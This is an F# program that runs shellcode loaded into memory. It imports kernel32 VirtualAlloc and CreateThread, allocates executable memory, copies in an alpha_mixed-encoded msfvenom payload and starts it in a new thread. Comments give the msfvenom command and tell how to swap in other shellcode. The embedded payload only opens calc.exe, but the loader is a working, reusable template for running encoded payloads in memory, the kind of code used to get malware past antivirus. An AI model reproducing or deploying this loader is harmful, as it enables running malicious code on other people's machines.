open System
open System.Runtime.InteropServices
open System.Threading
 
[<DllImport "kernel32" >]
extern nativeint VirtualAlloc(
  nativeint         lpStartAddress,
  uint32            dwSize, 
  uint32            flAllocationType, 
  uint32         flProtect)
 
[<DllImport "kernel32" >]
extern nativeint CreateThread(
  uint32         lpThreadAttributes,
  uint32            dwStackSize, 
  nativeint            lpStartAddress, 
  uint32&         param,
  uint32         dwCreationFlags,
  uint32&         lpThreadId)
 
[<DllImport "kernel32" >]
extern nativeint WaitForSingleObject(
  nativeint         hHandle,
  uint32         dwMilliseconds)
 
  
let mutable threadId : uint32 = (uint32)0
let mutable pInfo : uint32 = (uint32)0

//msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f csharp
//Find/Replace "," with "uy;", and then wrap all the shellcode in [|shellcode_goes_here|]

let mutable shellcode : byte[] = [|0x89uy;0xe6uy;0xdbuy;0xdauy;0xd9uy;0x76uy;0xf4uy;0x58uy;0x50uy;0x59uy;0x49uy;0x49uy;0x49uy;0x49uy;0x49uy;
0x49uy;0x49uy;0x49uy;0x49uy;0x49uy;0x43uy;0x43uy;0x43uy;0x43uy;0x43uy;0x43uy;0x37uy;0x51uy;0x5auy;0x6auy;
0x41uy;0x58uy;0x50uy;0x30uy;0x41uy;0x30uy;0x41uy;0x6buy;0x41uy;0x41uy;0x51uy;0x32uy;0x41uy;0x42uy;0x32uy;
0x42uy;0x42uy;0x30uy;0x42uy;0x42uy;0x41uy;0x42uy;0x58uy;0x50uy;0x38uy;0x41uy;0x42uy;0x75uy;0x4auy;0x49uy;
0x79uy;0x6cuy;0x68uy;0x68uy;0x4fuy;0x72uy;0x55uy;0x50uy;0x63uy;0x30uy;0x77uy;0x70uy;0x61uy;0x70uy;0x4euy;
0x69uy;0x4buy;0x55uy;0x55uy;0x61uy;0x79uy;0x50uy;0x70uy;0x64uy;0x4euy;0x6buy;0x42uy;0x70uy;0x50uy;0x30uy;
0x6cuy;0x4buy;0x32uy;0x72uy;0x66uy;0x6cuy;0x4euy;0x6buy;0x56uy;0x32uy;0x65uy;0x44uy;0x6cuy;0x4buy;0x42uy;
0x52uy;0x55uy;0x78uy;0x64uy;0x4fuy;0x38uy;0x37uy;0x50uy;0x4auy;0x54uy;0x66uy;0x56uy;0x51uy;0x6buy;0x4fuy;
0x6cuy;0x6cuy;0x75uy;0x6cuy;0x75uy;0x31uy;0x63uy;0x4cuy;0x36uy;0x62uy;0x44uy;0x6cuy;0x75uy;0x70uy;0x39uy;
0x51uy;0x4auy;0x6fuy;0x44uy;0x4duy;0x47uy;0x71uy;0x4fuy;0x37uy;0x7auy;0x42uy;0x6cuy;0x32uy;0x42uy;0x72uy;
0x43uy;0x67uy;0x6cuy;0x4buy;0x56uy;0x32uy;0x64uy;0x50uy;0x4cuy;0x4buy;0x33uy;0x7auy;0x55uy;0x6cuy;0x6cuy;
0x4buy;0x62uy;0x6cuy;0x56uy;0x71uy;0x64uy;0x38uy;0x4buy;0x53uy;0x70uy;0x48uy;0x43uy;0x31uy;0x58uy;0x51uy;
0x33uy;0x61uy;0x6cuy;0x4buy;0x43uy;0x69uy;0x77uy;0x50uy;0x73uy;0x31uy;0x4buy;0x63uy;0x6euy;0x6buy;0x32uy;
0x69uy;0x32uy;0x38uy;0x59uy;0x73uy;0x54uy;0x7auy;0x51uy;0x59uy;0x4cuy;0x4buy;0x75uy;0x64uy;0x4euy;0x6buy;
0x53uy;0x31uy;0x39uy;0x46uy;0x66uy;0x51uy;0x39uy;0x6fuy;0x6euy;0x4cuy;0x4fuy;0x31uy;0x6auy;0x6fuy;0x36uy;
0x6duy;0x73uy;0x31uy;0x4buy;0x77uy;0x66uy;0x58uy;0x6buy;0x50uy;0x72uy;0x55uy;0x4auy;0x56uy;0x37uy;0x73uy;
0x71uy;0x6duy;0x5auy;0x58uy;0x37uy;0x4buy;0x31uy;0x6duy;0x51uy;0x34uy;0x73uy;0x45uy;0x4auy;0x44uy;0x42uy;
0x78uy;0x6euy;0x6buy;0x52uy;0x78uy;0x76uy;0x44uy;0x56uy;0x61uy;0x79uy;0x43uy;0x70uy;0x66uy;0x6euy;0x6buy;
0x76uy;0x6cuy;0x30uy;0x4buy;0x4cuy;0x4buy;0x56uy;0x38uy;0x45uy;0x4cuy;0x65uy;0x51uy;0x4euy;0x33uy;0x6euy;
0x6buy;0x36uy;0x64uy;0x4cuy;0x4buy;0x76uy;0x61uy;0x48uy;0x50uy;0x4duy;0x59uy;0x30uy;0x44uy;0x57uy;0x54uy;
0x56uy;0x44uy;0x63uy;0x6buy;0x51uy;0x4buy;0x43uy;0x51uy;0x70uy;0x59uy;0x50uy;0x5auy;0x33uy;0x61uy;0x4buy;
0x4fuy;0x69uy;0x70uy;0x63uy;0x6fuy;0x33uy;0x6fuy;0x33uy;0x6auy;0x4cuy;0x4buy;0x46uy;0x72uy;0x4auy;0x4buy;
0x4euy;0x6duy;0x51uy;0x4duy;0x63uy;0x5auy;0x77uy;0x71uy;0x4cuy;0x4duy;0x4fuy;0x75uy;0x48uy;0x32uy;0x47uy;
0x70uy;0x37uy;0x70uy;0x53uy;0x30uy;0x66uy;0x30uy;0x45uy;0x38uy;0x76uy;0x51uy;0x6euy;0x6buy;0x52uy;0x4fuy;
0x4duy;0x57uy;0x59uy;0x6fuy;0x4buy;0x65uy;0x6duy;0x6buy;0x5auy;0x50uy;0x78uy;0x35uy;0x69uy;0x32uy;0x52uy;
0x76uy;0x31uy;0x78uy;0x79uy;0x36uy;0x7auy;0x35uy;0x4duy;0x6duy;0x6duy;0x4duy;0x6buy;0x4fuy;0x6auy;0x75uy;
0x35uy;0x6cuy;0x36uy;0x66uy;0x43uy;0x4cuy;0x45uy;0x5auy;0x4fuy;0x70uy;0x6buy;0x4buy;0x6buy;0x50uy;0x34uy;
0x35uy;0x56uy;0x65uy;0x4duy;0x6buy;0x51uy;0x57uy;0x32uy;0x33uy;0x64uy;0x32uy;0x32uy;0x4fuy;0x50uy;0x6auy;
0x33uy;0x30uy;0x73uy;0x63uy;0x59uy;0x6fuy;0x4euy;0x35uy;0x35uy;0x33uy;0x43uy;0x51uy;0x70uy;0x6cuy;0x45uy;
0x33uy;0x44uy;0x6euy;0x65uy;0x35uy;0x43uy;0x48uy;0x43uy;0x55uy;0x43uy;0x30uy;0x41uy;0x41uy;|]
 
let address = VirtualAlloc((nativeint)0, (uint32)shellcode.Length, (uint32)0x1000, (uint32)0x40)
 
Marshal.Copy(shellcode, 0, address, shellcode.Length)
let hThread = CreateThread((uint32)0,(uint32)0, address, &pInfo, (uint32)0, &threadId)
WaitForSingleObject(hThread, (uint32)0xFFFFFFFF) |> ignore